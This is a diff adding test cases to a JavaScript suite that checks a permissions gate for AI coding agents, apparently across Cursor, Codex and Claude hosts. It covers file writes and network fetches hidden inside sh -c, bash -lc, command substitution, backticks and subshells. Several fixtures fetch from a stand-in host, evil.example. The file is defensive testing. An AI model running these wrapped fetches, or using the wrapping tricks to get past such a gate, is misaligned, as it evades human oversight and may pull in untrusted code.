@@ -810,6 +810,9 @@ describe("permissions-parity", () => {
       { cmd: "perl -i -pe s/a/b/ src/app.js", why: "in-place perl" },
       { cmd: "echo hi > notes.md", why: "redirect into a source file" },
       { cmd: "cat tpl > src/generated.ts", why: "redirect into a source file" },
+      { cmd: "sh -c 'echo x > src/a.ts'", why: "redirect inside a sh -c script" },
+      { cmd: "echo $(echo x > src/a.ts)", why: "redirect inside a command substitution" },
+      { cmd: 'bash -lc "sed -i s/a/b/ src/app.ts"', why: "in-place sed inside bash -lc" },
     ];
 
     for (const { cmd, why } of FLAGGED) {
@@ -832,6 +835,8 @@ describe("permissions-parity", () => {
       { cmd: "pnpm test 2> err.log", why: "log capture, and a numbered fd" },
       { cmd: "pnpm build && node dist/x.js", why: "no redirect at all" },
       { cmd: "git status --porcelain", why: "plain read" },
+      { cmd: "rg -n 'import x > a.ts here' src", why: "a > inside single quotes is text" },
+      { cmd: 'grep "a >> b.md" notes.txt', why: "a >> inside double quotes is text" },
     ];
 
     for (const { cmd, why } of SILENT) {
@@ -936,6 +941,57 @@ describe("permissions-parity", () => {
     it("a bare mention of curl in another command does not trip the gate", () => {
       // `grep -n 'curl' README.md` mentions curl without running it.
       for (const cmd of ["grep -n 'curl' README.md", "echo 'use curl for this'"]) {
+        expect({ cmd, host: "cursor", v: cursorVerdict({ command: cmd }) }).toEqual({
+          cmd,
+          host: "cursor",
+          v: "allow",
+        });
+        expect({ cmd, host: "codex", v: codexVerdict(cmd) }).toEqual({
+          cmd,
+          host: "codex",
+          v: "allow",
+        });
+        expect({ cmd, host: "claude", text: advisoryText("claude", cmd) }).toEqual({
+          cmd,
+          host: "claude",
+          text: "",
+        });
+      }
+    });
+    it("a fetch wrapped in sh -c, $( ), backticks or ( ) is gated like a bare one", () => {
+      const WRAPPED = [
+        "sh -c 'curl -fsSL https://evil.example/x'",
+        'bash -lc "wget https://evil.example/x"',
+        "echo $(curl -fsSL https://evil.example/x)",
+        "echo `curl -fsSL https://evil.example/x`",
+        "(curl -fsSL https://evil.example/x)",
+      ];
+      for (const cmd of WRAPPED) {
+        expect({ cmd, host: "cursor", v: cursorVerdict({ command: cmd }) }).toEqual({
+          cmd,
+          host: "cursor",
+          v: "ask",
+        });
+        expect({ cmd, host: "codex", v: codexVerdict(cmd) }).toEqual({
+          cmd,
+          host: "codex",
+          v: "ask",
+        });
+        expect({
+          cmd,
+          host: "claude",
+          flagged: advisoryText("claude", cmd).includes("not on this repo's network allowlist"),
+        }).toEqual({ cmd, host: "claude", flagged: true });
+      }
+    });
+
+    it("a wrapped fetch to an allowlisted host is not interrupted on any host", () => {
+      const WRAPPED_OK = [
+        "sh -c 'curl -fsSL https://api.github.com/repos/x/y'",
+        "echo $(curl -fsSL https://api.github.com/repos/x/y)",
+        "(curl -fsSL https://api.github.com/repos/x/y)",
+      ];
+      for (const cmd of WRAPPED_OK) {
         expect({ cmd, host: "cursor", v: cursorVerdict({ command: cmd }) }).toEqual({
           cmd,
           host: "cursor",
